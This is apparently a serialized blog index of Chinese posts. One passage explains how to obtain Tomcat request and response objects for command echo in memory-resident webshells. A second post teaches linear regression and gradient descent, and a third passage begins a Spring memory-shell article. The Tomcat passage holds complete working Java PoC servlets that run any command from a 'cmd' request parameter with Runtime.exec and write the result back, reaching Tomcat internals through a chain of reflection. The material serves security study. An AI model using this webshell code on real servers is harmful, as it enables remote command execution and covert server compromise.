ApplicationFilterChain.class.getDeclaredField(\"lastServicedResponse\");\n\t\t\t//使用modifiersField反射修改final型变量\n\t\t\tjava.lang.reflect.Field modifiersField = Field.class.getDeclaredField(\"modifiers\");\n\t\t\tmodifiersField.setAccessible(true);\n\t\t\tmodifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);\n\t\t\tmodifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);\n\t\t\tmodifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);\n\t\t\tWRAP_SAME_OBJECT_FIELD.setAccessible(true);\n\t\t\tlastServicedRequestField.setAccessible(true);\n\t\t\tlastServicedResponseField.setAccessible(true);\n\t\t\t//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量\n\t\t\t//第一次请求进行初始化\n\t\t\tif (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)){\n\t\t\t\tWRAP_SAME_OBJECT_FIELD.setBoolean(null,true);\n\t\t\t}\n\t\t\tif (lastServicedRequestField.get(null)==null){\n\t\t\t\tlastServicedRequestField.set(null, new ThreadLocal<>());\n\t\t\t}\n\t\t\tif (lastServicedResponseField.get(null)==null){\n\t\t\t\tlastServicedResponseField.set(null, new ThreadLocal<>());\n\t\t\t}\n\t\t\t//第二次请求获取request变量\n\t\t\tif(lastServicedRequestField.get(null)!=null){\n\t\t\t\tThreadLocal threadLocalReq = (ThreadLocal) lastServicedRequestField.get(null);\n\t\t\t\tThreadLocal threadLocalRes =(ThreadLocal) lastServicedResponseField.get(null);\n\t\t\t\tHttpServletRequest request = (HttpServletRequest) threadLocalReq.get();\n\t\t\t\tHttpServletResponse response= (HttpServletResponse) threadLocalRes.get();\n\t\t\t\tif(request!=null || response!=null){\n\t\t\t\t\tcmdEcho(request,response);\n\t\t\t\t}\n\t\t\t}\n\t\t} catch (NoSuchFieldException | IllegalAccessException | ClassNotFoundException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\n\n\tpublic  void cmdEcho(HttpServletRequest request,HttpServletResponse response){\n\t\tPrintWriter writer;\n\t\tresponse.setCharacterEncoding(\"gbk\");\n\t\ttry {\n\t\t\twriter = response.getWriter();\n\t\t\tString cmd = request.getParameter(\"cmd\");\n\t\t\tInputStream inputStream;\n\t\t\tif(cmd!=null){\n\t\t\t\tinputStream = Runtime.getRuntime().exec(cmd).getInputStream();\n\t\t\t\tScanner scanner = new Scanner(inputStream).useDelimiter(\"\\\\A\");\n\t\t\t\tString result = scanner.hasNext()?scanner.next():\"\";\n\t\t\t\tscanner.close();\n\t\t\t\twriter.write(result);\n\t\t\t\twriter.flush();\n\t\t\t\twriter.close();\n\t\t\t}\n\n\t\t} catch (IOException e) {\n\t\t\tthrow new RuntimeException(e);\n\t\t}\n\t}\n}\n\n```\n<a name=\"FIhHd\"></a>\n### 局限性\n如果漏洞在ApplicationFilterChain获取回显Response代码之前，那么就无法获取到Tomcat Response进行回显。如Shiro RememberMe反序列化漏洞，因为Shiro的RememberMe功能实际上就是一个自定义的Filter。我们知道在ApplicationFilterChain#internalDoFilter方法中，doFilter方法实际上是在我们获取response之前的。因此在Shiro漏洞环境下我们无法通过这种方式获得回显。\n\n<a name=\"plH79\"></a>\n## 通过全局存储Response回显\nServlet容器是Java Web的核心，因此很多框架对于该容器都进行了一定程度的封装。不同框架、同一框架的不同版本的实现都有可能不同，因此我们很难找到一种通用的获取回显的方法。<br />比如我们上文通过ThreadLocal类来获取回显的方式就无法适用于Shiro框架下，那么我们能不能换一种思路，寻找Tomcat中全局存储的Request和Response\n\nrequest和response对象必须是属于当前线程的，因此通过全局存储获取回显的关键就在于找到当前代码运行的上下文和Tomcat运行上下文的联系\n<a name=\"WgmNT\"></a>\n### 调用栈分析\n首先我们先来寻找一下Tomcat中的一些全局Response。在AbstractProcessor类中，我们能够找到全局response<br /><img src=\"/img/3-16/3.png\" ><br />再来看看一个Servlet的调用栈<br /><img src=\"/img/3-16/4.png\" >\n```java\ndoGet:25, Tomcat_Echo\nservice:655, HttpServlet (javax.servlet.http)\nservice:764, HttpServlet (javax.servlet.http)\ninternalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)\ndoFilter:162, ApplicationFilterChain (org.apache.catalina.core)\n...\nservice:357, CoyoteAdapter (org.apache.catalina.connector)\nservice:382, Http11Processor (org.apache.coyote.http11)\nprocess:65, AbstractProcessorLight (org.apache.coyote)\nprocess:895, AbstractProtocol$ConnectionHandler (org.apache.coyote)\ndoRun:1722, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)\nrun:49, SocketProcessorBase (org.apache.tomcat.util.net)\nrunWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)\nrun:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)\nrun:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)\nrun:745, Thread (java.lang)\n```\n调用了Http11Processor#service方法<br /><img src=\"/img/3-16/5.png\" ><br />而Http11Processor继承了AbstractProcessor类，这里的response对象正是AbstractProcessor类中的属性，因此我们如果能获取到Http11Processor类，就能获取到response对象<br /><img src=\"/img/3-16/6.png\" ><br />所以调用栈继续往上翻，在AbstractProtcol内部类ConnectionHandler的register方法中存在着对Http11Processor的操作<br /><img src=\"/img/3-16/7.png\" ><br />我们接着往下看，调用栈调用了内部类ConnectoinHandler的process()方法，该方法会调用registry方法将processor存储在global中<br /><img src=\"/img/3-16/8.png\" >\n\n<img src=\"/img/3-16/9.png\" ><br />该属性中存储了一个RequestInfo的List，其中在RequestInfo中我们也能获取Request<br /><img src=\"/img/3-16/10.png\" >\n\n\n现在我们的工作就是获取AbstractProtocol类或者继承AbstractProtocol的类，继续看调用链。在CoyoteAdapter类中，存在一个connector属性<br /><img src=\"/img/3-16/11.png\" ><br />我们来看Connector类，存在和AbstractProtocol相关的protocolHandler属性<br /><img src=\"/img/3-16/12.png\" ><br />此时我们看调用链，该属性的值为一个Http11NioProtocol对象，并且该类继承了AbstractProtocol类\n\n那么反射获取链\n```java\nConnector----->Http11NioProtocol----->AbstractProtocol$ConnectoinHandler#process()------->this.global-------->RequestInfo------->Request-------->Response\n```\n下面就是获取Connector了，Tomcat在启动时会通过StandardService创建Connector<br />Tomcat#setConnect中<br /><img src=\"/img/3-16/13.png\" ><br />StandardService#addConnector如下，该方法会将Connector放入属性connectors中<br /><img src=\"/img/3-16/14.png\" ><br />下面的工作就是获取StandardService对象了\n\n<a name=\"PNnb8\"></a>\n### Tomcat类加载\n> 下面废话一堆，就是平常审计代码中常见的操作--从当前线程拿到类加载器\n\nTomcat使用的并不是传统的类加载机制，我们来看下面的例子\n\n我们知道，Tomcat中的一个个Webapp就是一个个Web应用，如果WebAPP A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2。这样在加载的时候由于全限定名相同，因此不能同时加载，所以必须对各个Webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离。\n\nTomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是WebappClassLoader。\n\n那么我们又如何将原有的父加载器和WebappClassLoader联系起来呢？这里Tomcat使用的机制是线程上下文类加载器Thread ContextClassLoader。\n\n**Thread类中有getContextClassLoader()和setContextClassLoader(ClassLoader cl)方法用来获取和设置上下文类加载器**。如果没有setContextClassLoader(ClassLoader cl)方法通过设置类加载器，那么线程将继承父线程的上下文类加载器，如果在应用程序的全局范围内都没有设置的话，那么这个上下文类加载器默认就是应用程序类加载器。<br />对于Tomcat来说ContextClassLoader被设置为WebAppClassLoader（在一些框架中可能是继承了public abstract WebappClassLoaderBase的其他Loader)。\n\n因此WebappClassLoaderBase就是我们寻找的Thread和Tomcat 运行上下文的联系之一。\n\n这里通过调试，我们能够看到这里的线程类加载器是继承了WebAppClassLoader的ParallelWebAppClassLoader。<br /><img src=\"/img/3-16/15.png\" >\n\n<img src=\"/img/3-16/16.png\" >\n\n<img src=\"/img/3-16/17.png\" >\n\n拿到类加载器后，发现后面的resource中的context是StandarContext<br />看看StandarContext中的context属性<br /><img src=\"/img/3-16/18.png\" ><br />再从StandarContext中反射拿到ApplicationContext<br /><img src=\"/img/3-16/19.png\" >\n\n<a name=\"HwvsX\"></a>\n### payload构造\n思路总结\n\n1. 从当前线程拿到类加载器\n2. 获取ApplicationContext\n3. 获取从ApplicationContext中获取StandarService\n4. 从StandardService获取Connector\n5. Connector#getProtocolHandler方法来获取对应的protocolHandler，并反射获取内部类ConnectionHandler\n6. 获取gobal属性\n7. 获取processor,进一步获取Request\n\n多层套娃下,反射拿到Request<br /><img src=\"/img/3-16/20.png\" ><br />获取StandardContext：<br />踩坑 : 反射时候最好使用Class.forName获取类<br />（最好别用getClass(),就怕获取的是子类的Class,无法获取父类的field)<br />本来获取resources是有getResources方法的，但是返回null<br /><img src=\"/img/3-16/21.png\" >\n```java\nWebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\nField resourcesField = Class.forName(\"org.apache.catalina.loader.WebappClassLoaderBase\").getDeclaredField(\"resources\");\nresourcesField.setAccessible(true);\nStandardContext standardContext = (StandardContext) ((WebResourceRoot) resourcesField.get(classLoader)).getContext();\n```\n获取ApplicationContext：<br />其实上面步骤就是为了这步，以前我们是靠着Request拿到ApplicationContext，但这次我们需要拿到Request\n```java\n//获取ApplicationContext\nField contextField = Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredField(\"context\");\ncontextField.setAccessible(true);\nApplicationContext context = (ApplicationContext) contextField.get(standardContext);\n```\n获取StandardService：\n```java\nField serviceField = Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredField(\"service\");\nserviceField.setAccessible(true);\nStandardService service = (StandardService) serviceField.get(context);\n```\n获取connector：\n```java\nField connectorsField = Class.forName(\"org.apache.catalina.core.StandardService\").getDeclaredField(\"connectors\");\nconnectorsField.setAccessible(true);\nConnector[] connectors = (Connector[]) connectorsField.get(service);\nConnector connector=connectors[0];\n```\n获取Handler：\n```java\nProtocolHandler protocolHandler = connector.getProtocolHandler();\nField handleField = Class.forName(\"org.apache.coyote.AbstractProtocol\").getDeclaredField(\"handler\");\nhandleField.setAccessible(true);\nAbstractEndpoint.Handler handle = (AbstractEndpoint.Handler) handleField.get(protocolHandler);\n```\n获取processors：\n```java\nField processorsField = Class.forName(\"org.apache.coyote.RequestGroupInfo\").getDeclaredField(\"processors\");\nprocessorsField.setAccessible(true);\nList<RequestInfo> processors = (List<RequestInfo>) processorsField.get(handle.getGlobal());\n```\n获取Request和Request：<br />值得注意的是我们最终获取的Request是org.apache.coyote.Request<br /><img src=\"/img/3-16/22.png\" ><br />最后需要的是org.apache.catalina.connector.Request<br /><img src=\"/img/3-16/23.png\" ><br />通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request和Response\n```java\nField reqfield = Class.forName(\"org.apache.coyote.RequestInfo\").getDeclaredField(\"req\");\nreqfield.setAccessible(true);\nfor (RequestInfo processor : processors) {\n    Request request= (Request) reqfield.get(processor);\n    org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);\n    org.apache.catalina.connector.Response http_response = http_request.getResponse();\n    \n}\n```\n<a name=\"AQmwi\"></a>\n### 完整Poc\n```java\npackage com.yyjccc.memorytrojan.Echo;\n\nimport org.apache.catalina.WebResourceRoot;\nimport org.apache.catalina.connector.Connector;\nimport org.apache.catalina.core.ApplicationContext;\nimport org.apache.catalina.core.StandardContext;\nimport org.apache.catalina.core.StandardService;\nimport org.apache.catalina.loader.WebappClassLoaderBase;\nimport org.apache.coyote.ProtocolHandler;\nimport org.apache.coyote.Request;\nimport org.apache.coyote.RequestInfo;\nimport org.apache.tomcat.util.net.AbstractEndpoint;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.PrintWriter;\nimport java.lang.reflect.Field;\nimport java.util.List;\nimport java.util.Scanner;\n\n@WebServlet(\"/req\")\npublic class Tomcat_Req extends HttpServlet{\n\n\t@Override\n\tprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n\n\t\tWebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n\t\ttry {\n\t\t\t//获取StandardContext\n\t\t\tField resourcesField = Class.forName(\"org.apache.catalina.loader.WebappClassLoaderBase\").getDeclaredField(\"resources\");\n\t\t\tresourcesField.setAccessible(true);\n\t\t\tStandardContext standardContext = (StandardContext) ((WebResourceRoot) resourcesField.get(classLoader)).getContext();\n\n\t\t\t//获取ApplicationContext\n\t\t\tField contextField = Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredField(\"context\");\n\t\t\tcontextField.setAccessible(true);\n\t\t\tApplicationContext context = (ApplicationContext) contextField.get(standardContext);\n\n\t\t\t//获取StandardService\n\t\t\tField serviceField = Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredField(\"service\");\n\t\t\tserviceField.setAccessible(true);\n\t\t\tStandardService service = (StandardService) serviceField.get(context);\n\n\t\t\t//获取connectors\n\t\t\tField connectorsField = Class.forName(\"org.apache.catalina.core.StandardService\").getDeclaredField(\"connectors\");\n\t\t\tconnectorsField.setAccessible(true);\n\t\t\tConnector[] connectors = (Connector[]) connectorsField.get(service);\n\t\t\tConnector connector=connectors[0];\n\n\t\t\t//获取Handler\n\t\t\tProtocolHandler protocolHandler = connector.getProtocolHandler();\n\t\t\tField handleField = Class.forName(\"org.apache.coyote.AbstractProtocol\").getDeclaredField(\"handler\");\n\t\t\thandleField.setAccessible(true);\n\t\t\tAbstractEndpoint.Handler handle = (AbstractEndpoint.Handler) handleField.get(protocolHandler);\n\n\t\t\t//获取processors\n\t\t\tField processorsField = Class.forName(\"org.apache.coyote.RequestGroupInfo\").getDeclaredField(\"processors\");\n\t\t\tprocessorsField.setAccessible(true);\n\t\t\tList<RequestInfo> processors = (List<RequestInfo>) processorsField.get(handle.getGlobal());\n\n\t\t\t//获取Request\n\t\t\tField reqfield = Class.forName(\"org.apache.coyote.RequestInfo\").getDeclaredField(\"req\");\n\t\t\treqfield.setAccessible(true);\n\t\t\tfor (RequestInfo processor : processors) {\n\t\t\t\tRequest request= (Request) reqfield.get(processor);\n\n\t\t\t\torg.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);\n\t\t\t\torg.apache.catalina.connector.Response http_response = http_request.getResponse();\n\t\t\t\tcmdEcho(http_request,http_response);\n\t\t\t}\n\t\t} catch (NoSuchFieldException | IllegalAccessException | ClassNotFoundException e) {\n\t\t\tthrow new RuntimeException(e);\n\t\t}\n\n\t}\n\n\tpublic void cmdEcho(HttpServletRequest request,HttpServletResponse response){\n\t\tPrintWriter writer;\n        //解决windows乱码\n\t\tresponse.setCharacterEncoding(\"gbk\");\n\t\ttry {\n\t\t\twriter = response.getWriter();\n\t\t\tString cmd = request.getParameter(\"cmd\");\n\t\t\tInputStream inputStream;\n\t\t\tif(cmd!=null){\n\t\t\t\tinputStream = Runtime.getRuntime().exec(cmd).getInputStream();\n\t\t\t\tScanner scanner = new Scanner(inputStream).useDelimiter(\"\\\\A\");\n\t\t\t\tString result = scanner.hasNext()?scanner.next():\"\";\n\t\t\t\tscanner.close();\n\t\t\t\twriter.write(result);\n\t\t\t\twriter.flush();\n\t\t\t\twriter.close();\n\t\t\t}\n\n\t\t} catch (IOException e) {\n\t\t\tthrow new RuntimeException(e);\n\t\t}\n\n\t}\n}\n\n```\n\n<img src=\"/img/3-16/24.png\" >\n\n<a name=\"CVm7U\"></a>\n### 缺陷\n利用链过长，会导致http包超长，可先修改org.apache.coyote.http11.AbstractHttp11Protocol的maxHeaderSize的大小，这样再次发包的时候就不会有长度限制。还有就是操作复杂可能有性能问题，整体来讲该方法不受各种配置的影响，通用型较强。\n","tags":["java安全","内存马","Tomcat"],"categories":["java安全"]},{"title":"线性回归","url":"/2024/03/12/线性回归/","content":"\n\n\n# 线性回归（Linear Regression）\n\n\n\n机器学习中的两大类问题：回归问题和分类问题\n\n> 回归问题就是进行预测，如股票、房价预测\n> 分类问题就是将多个事物进行分类\n\n线性回归是一种用于预测连续数值输出的监督学习算法，它通过建立一个线性方程来描述输入变量与输出变量之间的关系。该算法的目标是使预测值与真实值之间的差异最小化。\n\n<a name=\"u4Zwx\"></a>\n## 概述\n线性回归是通过**一个或多个自变量与因变量**之间进行建模的回归分析，其特点为一个或多个称为回归系数的模型参数的线性组合。样本点为历史数据，**回归曲线要能最贴切的模拟样本点的趋势，将误差降到最小**。\n\n<a name=\"Inoua\"></a>\n### 线性回归方程\n 线形回归方程，就是有 **n** 个特征，然后每个特征 **Xi **都有相应的系数 **Wi **，并且在所有特征值为0的情况下，目标值有一个默认值 **W0 **，因此：<br /><img src=\"/img/3-13/1.svg\" ><br />**整合后的公式为**：\n\n<img src=\"/img/3-13/2.svg\" >\n\n<a name=\"ETAVk\"></a>\n## 损失函数\n<a name=\"NmYVp\"></a>\n### 公式\n 损失函数是一个贯穿整个机器学习的一个重要概念，大部分机器学习算法都有误差，我们需要通过显性的公式来描述这个误差，并将这个误差优化到最小值。<br />**误差项**：<br /><img src=\"/img/3-13/3.svg\" ><br />用来表示真实值和预测值之间的差异\n\n假设现在**真实的值**为 **y**，**预测的值**为 **h** ,损失函数为：<br /><img src=\"/img/3-13/4.svg\" >\n> 其实机器学习在算法大思想下，关键是如何迭代调整参数能使得误差变小，\n> 一般情况下算法最后推出的数学公式也是无法直接计算求解\n\n\n上面损失函数也就是所有误差和的平方。损失函数值越小，说明误差越小，这个损失函数也称**最小二乘法**。\n\n\n<a name=\"lXo7T\"></a>\n### 公式推导\n**前提假设：**误差<img src=\"/img/3-13/5.svg\" >是独立并具有相同的分布，并且服从均值为0，方差为<img src=\"/img/3-13/6.svg\" >的高斯分布\n\n独立同分布（independent and identically distributed，i.i.d.）：<br />在概率统计理论中，指随机过程中，任何时刻的取值都为随机变量，如果这些随机变量服从同一分布，并且互相独立，那么这些随机变量是独立同分布。\n\n高斯分布：<br />即正态分布，概率密度函数如下如下：<br /><img src=\"/img/3-13/7.svg\" ><br />这里就是取μ为0，即<br /><img src=\"/img/3-13/8.svg\" ><br />将误差项计算公式,带入概率密度公式得到，预测准确的概率：<br /><img src=\"/img/3-13/9.svg\" >\n\n由于是多个样本，每个样本都是上面概率公式，这里就非常适合使用极大似然法，目标是求取一组W参数向量，使得概率取最大值<br />即求函数极值点<br />极大似然就不多说了，复习概率论就行\n\n似然函数：<br /><img src=\"/img/3-13/10.svg\" ><br />对似然函数取对数，将乘法转为加法\n\n将上面得到式子化简得到：<br /><img src=\"/img/3-13/11.svg\" >\n\n求最大值转化为求下面的最小值<br /><img src=\"/img/3-13/12.svg\" >\n\n\n<a name=\"n13p4\"></a>\n### 特殊解\n目标函数：<br /><img src=\"/img/3-13/13.svg\" >\n\n化简：其中<br /><img src=\"/img/3-13/14.png\" >\n\n一般都不能直接算，因为这里只是特殊解，要求<img src=\"/img/3-13/15.svg\" >要有逆元\n\n\n<a name=\"Q5JgW\"></a>\n## 梯度下降\n<img src=\"/img/3-13/16.png\" ><br /> \n\n> 上面最小二乘法无法直接求解，但可以使用梯度下降算法逼近最小值\n\n梯度就是函数对它的各个自变量求偏导后，由偏导数组成的一个向量。\n\n数学推导：[梯度下降法的数学原理 — 数据科学：从基础到实战 version 3a0c599](https://dsfftp.readthedocs.io/zh-cn/latest/Linear-Regression/%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D%E6%B3%95%E7%9A%84%E6%95%B0%E5%AD%A6%E5%8E%9F%E7%90%86.html)<br />大概公式就是\t\t\n\n<img src=\"/img/3-13/17.svg\" >\n\nλ表示步长或者说是学习系数，由我们定义，更加梯度下降原理，每次向着导数的反方向移动，就会逼近最小点\n\n- λ取太小，会陷入局部极值点\n- λ取太大，学习成本非常高\n\n<a name=\"THeBg\"></a>\n### 批量梯度下降（BGD）\n批量梯度下降法（Batch Gradient Descent，简称BGD）是梯度下降法最原始的形式，它的具体思路是在更新每一参数时都使用所有的样本来进行更新。<br />我们的目的是要**误差函数尽可能的小**，即求解weights使误差函数尽可能小。首先，我们随机初始化weigths，然后**不断反复的更新weights使得误差函数减小，**直到满足要求时停止。这里更新算法我们选择梯度下降算法，利用初始化的weights并且反复更新weights：<br /><img src=\"/img/3-13/18.png\" ><br />这里代表学习率，表示**每次向着J最陡峭的方向迈步的大小**。为了更新weights，**我们需要求出函数J的偏导数。首先当我们只有一个数据点（x,y）的时候，J的偏导数是：**<br /><img src=\"/img/3-13/19.png\" ><br />则对**所有数据点，**上述损失函数的偏导（**累和**）为：<br /><img src=\"/img/3-13/20.png\" ><br />再最小化损失函数的过程中，**需要不断反复的更新weights使得误差函数减小**，更新过程如下：<br /><img src=\"/img/3-13/21.png\" ><br />那么好了，**每次参数更新的伪代码**如下：<br /><img src=\"/img/3-13/22.png\" ><br />由上图更新公式我们就可以看到，**我们每一次的参数更新都用到了所有的训练数据**（比如有m个，就用到了m个），如果训练数据非常多的话，**是非常耗时的。**<br />**下面给出批梯度下降的收敛图：**\n\n<img src=\"/img/3-13/23.png\" ><br />从图中，我们可以得到BGD迭代的次数相对较少。<br />代码实现：\n```python\ndef batchGradientDescent(x, y, theta, alpha, m, maxIteration):\n    for i in range(maxIteration):\n        hypothesis = np.dot(x, theta)\n        loss = hypothesis - y\n        gradient = np.dot(x.transpose(), loss) / m\n        theta = theta - alpha * gradient              # 对所有样本求和\n    return theta\n```\n<a name=\"abTdI\"></a>\n### 随机梯度下降法（SGD）\n由于批梯度下降每跟新一个参数的时候，要用到所有的样本数，所以训练速度会随着样本数量的增加而变得非常缓慢。随机梯度下降正是为了解决这个办法而提出的。它是利用每个样本的损失函数对θ求偏导得到对应的梯度，来更新θ：<br /><img src=\"/img/3-13/24.png\" ><br />更新过程如下：<br /><img src=\"/img/3-13/25.png\" ><br />随机梯度下降是通过每个样本来迭代更新一次，对比上面的批量梯度下降，迭代一次需要用到所有训练样本（**往往如今真实问题训练数据都是非常巨大**），一次迭代不可能最优，如果迭代10次的话就需要遍历训练样本10次。<br />**但是，SGD伴随的一个问题是噪音较BGD要多，使得SGD并不是每次迭代都向着整体最优化方向。**<br />**随机梯度下降收敛图如下：**<br /><img src=\"/img/3-13/26.png\" ><br />我们可以从图中看出SGD迭代的次数较多，在解空间的搜索过程看起来很盲目。**但是大体上是往着最优值方向移动。**<br />**代码实现：**\n```python\ndef StochasticGradientDescent(x, y, theta, alpha, m, maxIteration):\n    data = []\n    for i in range(10):\n        data.append(i)\n    # 这里随便挑选一个进行更新点进行即可（不用想BGD一样全部考虑）\n\n    for i in range(maxIteration):\n        hypothesis = np.dot(x, theta)\n        loss = hypothesis - y  # 这里还是有十个样本\n        index = random.sample(data, 1)[0]  # 随机抽取一个样本，得到它的下标\n        gradient = loss[index] * x[index]  # 只取一个点进行更新计算\n        theta = theta - alpha * gradient.T\n    return theta\n```\n\n\n<a name=\"Ly3Fu\"></a>\n###  小批量梯度下降法（MBGD）\n我们从上面两种梯度下降法可以看出，其各自均有优缺点，那么能不能在两种方法的性能之间取得一个折衷呢？既**算法的训练过程比较快，而且也要保证最终参数训练的准确率，**而这正是小批量梯度下降法（Mini-batch Gradient Descent，简称MBGD）的初衷。<br />我们假设每次更新参数的时候用到的样本数为10个（**不同的任务完全不同，这里举一个例子而已**）<br />更新伪代码如下：<br /><img src=\"/img/3-13/27.png\" >\n\n\n\n参考：\n\n- [https://cloud.tencent.com/developer/article/2359619](https://cloud.tencent.com/developer/article/2359619)\n- [https://www.cnblogs.com/zongfa/p/9293887.html](https://www.cnblogs.com/zongfa/p/9293887.html)\n","tags":["机器学习","算法","线性回归"]},{"title":"Spring内存马","url":"/2024/03/12/Spring内存马/","content":"\n\n\n# Spring内存马\n\n\n\n参考：\n\n- [Java安全学习——内存马 - 枫のBlog](https://goodapple.top/archives/1355)\n- [Spring内存马——Controller/Interceptor构造 - 先知社区](https://xz.aliyun.com/t/12047?time__1311=mqmhBKD50KAIKiqGNDQbiQ5SYrhnmqAxGOeD&alichlgref=https%3A%2F%2Fcn.bing.com%2F)\n- [Java内存马-SpringMVC篇_”expected lookuppath in request attribute \\“org.sp-CSDN博客](https://blog.csdn.net/mole_exp/article/details/123992395)\n\n> 在学习spring内存马的时候，最好知道spring、springmvc、springboot的开发知识和基本使用，下面就不多介绍基础的开发知识\n\n## 基础知识\n依赖\n```java\n<dependency>\n          <groupId>org.springframework</groupId>\n          <artifactId>spring-context</artifactId>\n          <version>6.1.4</version>\n      </dependency>\n      <dependency>\n          <groupId>org.springframework</groupId>\n          <artifactId>spring-webmvc</artifactId>\n          <version>6.1.4</version>\n      </dependency>\n```\n### Spring\nSpring是利用注解、反射和模板等技术实现的一种框架。其核心类是继承于HttpServlet的DispatchServlet。那既然是Servlet，那负责的肯定就是逻辑处理部分了，那么就需要Tomcat这样的服务器来给Spring提供运行环境。\n普遍的spring配置文件:\n```xml\n<web-app xmlns:xsi=\"<a href=\" http:=\"\" www.w3.org=\"\" 2001=\"\" XMLSchema-instance\"=\"\" rel=\"nofollow\">http://www.w3.org/2001/XMLSchema-instance\"\n  xmlns=\"http://java.sun.com/xml/ns/javaee\"\n  xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\"\n  version=\"2.5\">\n\n  <display-name>HelloSpringMVC</display-name>\n\n  <context-param>\n    <param-name>contextConfigLocation</param-name>\n    <param-value>/WEB-INF/applicationContext.xml</param-value>\n  </context-param>\n\n  <listener>\n    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n  </listener>\n\n  <servlet>\n    <servlet-name>dispatcherServlet</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    <init-param>\n      <param-name>contextConfigLocation</param-name>\n      <param-value>/WEB-INF/dispatcherServlet-servlet.xml</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>dispatcherServlet</servlet-name>\n    <url-pattern>/</url-pattern>\n  </servlet-mapping>\n</web-app>\n```\n\n#### ApplicationContext\n在Spring里，BeanFactory是IoC容器的实际代表，而ApplicationContext正好继承了BeanFactory，所以org.springframework.context.ApplicationContext接口也代表了IoC容器，一旦获得了ApplicationContext实例，也即获得了IoC容器的引用。\n这是BeanFactory与ApplicationContext的区别：\n> BeanFactory的实现是按需创建，即第一次获取Bean时才创建这个Bean，而ApplicationContext会一次性创建所有的Bean\n\n我们可以从ApplicationContext中可以根据Bean的ID获取Bean。\n<img src=\"/img/3-12/1.png\" >\n因此，org.springframework.context.ApplicationContext接口也代表了 IoC容器 ，它负责实例化、定位、配置应用程序中的对象(bean)及建立这些对象间(beans)的依赖。\n\n#### Root Context和Child Context\n我们来看看web.xml配置文件\n```xml\n...\n  <servlet>\n    <servlet-name>spring</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    <init-param>\n      <param-name>contextConfigLocation</param-name>\n      <param-value>/WEB-INF/springmvc.xml</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n  </servlet>\n  <servlet-mapping>\n    <servlet-name>spring</servlet-name>\n    <url-pattern>/</url-pattern>\n  </servlet-mapping>\n...\n```\n这里我们将DispatcherServlet设置别名为spring，然后将contextConfigLocation 参数值配置为/WEB-INF/springmvc.xml。\n\n依照规范，当没有显式配置 contextConfigLocation 时，程序会自动寻找 `/WEB-INF/<servlet-name>-servlet.xml，作为配置文件。因为上面的 <servlet-name> 是 dispatcherServlet，所以当没有显式配置时，程序依然会自动找到 /WEB-INF/dispatcherServlet-servlet.xml 配置文件。\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n  xmlns:mvc=\"http://www.springframework.org/schema/mvc\"\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xmlns:context=\"http://www.springframework.org/schema/context\"\n  xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n  http://www.springframework.org/schema/beans/spring-beans.xsd\n  http://www.springframework.org/schema/mvc\n  http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\">\n\n  <mvc:annotation-driven/>\n  <!-- 1.使用注解，扫描项目中的包 -->\n  <context:component-scan base-package=\"com.yyjccc.memorytrojan.Spring\"></context:component-scan>\n\n  <!-- 2.开启注解 -->\n  <mvc:annotation-driven/>\n\n  <!-- 3.配置例外：不是让所有的代码都走springmvc的过滤器 -->\n  <!-- 配置静态资源，不被DispatcherServlet处理 -->\n  <mvc:resources location=\"/images/\" mapping=\"/images/**\"/>\n  <mvc:resources location=\"/js/\" mapping=\"/js/**\"/>\n  <mvc:resources location=\"/css/\" mapping=\"/css/**\"/>\n\n  <!-- 4.定义跳转文件的前缀和后缀，视图view的配置 -->\n  <bean id=\"viewResolver\" class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\">\n    <property name=\"prefix\" value=\"/WEB-INF/views/\"></property>\n    <property name=\"suffix\" value=\".jsp\"></property>\n  </bean>\n\n</beans>\n```\n每个具体的 DispatcherServlet 创建的是一个 Child Context，代表一个独立的 